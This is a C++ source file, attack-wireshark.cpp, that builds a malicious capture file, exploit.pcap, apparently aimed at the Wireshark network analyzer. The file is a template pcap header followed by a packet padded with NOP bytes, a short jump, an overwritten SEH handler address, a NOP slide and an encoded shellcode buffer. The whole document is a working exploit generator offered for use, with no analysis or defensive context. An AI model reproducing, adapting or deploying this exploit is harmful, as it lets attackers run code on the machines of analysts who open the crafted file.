//Filename: attack-wireshark.cpp
#include <string>
#include <iostream>
#include <fstream>

using namespace std;

typedef long int32;
typedef short int16;
typedef char int8;
typedef unsigned long uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;

//PCAP Global Header
typedef __declspec(align(1)) struct pcap_hdr_s {
	uint32 magic_number;
	uint16 version_major;
	uint16 version_minor;
	int32 thiszone;
	uint32 sigfigs;
	uint32 snaplen;
	uint32 network;
} pcap_hdr_t;

//PCAP Packet Header
typedef __declspec(align(1)) struct pcaprec_hdr_s {
	uint32 ts_sec;
	uint32 ts_usec;
	uint32 incl_len;
	uint32 orig_len;
} pcaprec_hdr_t;

size_t const ETHER_ADDR_LEN = 6;

//Ethernet II Header
typedef __declspec(align(1)) struct ether_hdr_s {
	uint8 ether_dhost[ETHER_ADDR_LEN];
	uint8 ether_short[ETHER_ADDR_LEN];
	uint16 ether_type;
} ether_hdr_t;

string const TEMPLATE_FILE = "template.pcap";
string const EXPLOIT_FILE = "exploit.pcap";

char buf[] = 
"\xb8\xd7\x13\x93\x1c\xda\xc3\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x39\x31\x42\x12\x03\x42\x12\x83\x15\x17\x71\xe9\x65"
"\xf0\xfa\x12\x95\x01\x65\x9a\x70\x30\xb7\xf8\xf1\x61\x07"
"\x8a\x57\x8a\xec\xde\x43\x9d\x45\x94\x4d\x2a\xdb\x01\xa0"
"\xd3\x2d\x92\x6e\x17\x2f\x6e\x6c\x44\x8f\x4f\xbf\x99\xce"
"\x88\x76\xd7\x3f\x44\xdf\x9c\x92\x79\x54\xe0\x2e\x7b\xba"
"\x6e\x0e\x03\xbf\xb1\xfb\xbf\xbe\xe1\x8f\x08\xd8\x8a\xc8"
"\xa8\xd9\x5f\xb8\x2d\x10\x2b\x05\x67\x93\x2b\xfe\x43\x58"
"\xd2\xd7\x9d\x9e\x79\x16\x12\x13\x83\x5e\x95\xcb\xf6\x94"
"\xe5\x76\x01\x6f\x97\xac\x84\x70\x3f\x27\x3e\x55\xc1\xe4"
"\xd9\x1e\xcd\x41\xad\x79\xd2\x54\x62\xf2\xee\xdd\x85\xd5"
"\x66\xa5\xa1\xf1\x23\x7e\xcb\xa0\x89\xd1\xf4\xb3\x76\x8e"
"\x50\xbf\x95\xd9\xe5\x40\x66\xe6\xbb\x56\x92\x18\x44\xa7"
"\xd0\x6b\x21\xd5\x29\xb9\x87\x7d\x22\xd1\xd7\x15\xf6\x5e"
"\xfe\xe2\xf9\x75\x94\xec\xed\x7c\x69\xed\xed\x3c\x26\xab"
"\xcd\x94\xdd\x40\x7a\x14\xf6\xab\x82\x14\x06\xfc\xe7\x78"
"\x6a\x93\xc7\xf7\x1d\x19\x64\x93\xe1\xb7\x74\x33\xa7\xc4"
"\x23\xc4\xd8\x1e\xa1\xca\x4e\x51\x83\x68\xd8\x6e\x39";

int main() {
	pcap_hdr_t global_header;
	pcaprec_hdr_t packet_header;
	ether_hdr_t ether_header;
	
	size_t const OFFSET_LEN = 1239;
	string nops(OFFSET_LEN, '\x90');
	string next = "\xEB\x0A\x90\x90"; // JMP SHORT 0x0C (EB0A) # NOPx2
	string handler = "\x68\x8f\xf9\x64"; // 64F98F68
	string slide(50, '\x90');
	string shellcode(buf);
	
	string exploit = nops + next + handler + slide + shellcode;
 	
	ifstream fin(TEMPLATE_FILE.c_str(), ios::binary);
	fin.read((char*)&global_header, sizeof(global_header)).
		read((char*)&packet_header, sizeof(packet_header)).
		read((char*)&ether_header, sizeof(ether_header));
	
	packet_header.incl_len = packet_header.orig_len = sizeof(ether_header) + exploit.size();
	
	ether_header.ether_type = 0x2323;
	
	ofstream fout(EXPLOIT_FILE.c_str(), ios::binary);
	fout.write((char*)&global_header, sizeof(global_header)).
		 write((char*)&packet_header, sizeof(packet_header)).
		 write((char*)&ether_header, sizeof(ether_header))
		 << exploit;
		 
	cout << "OK: " << EXPLOIT_FILE << endl;
}
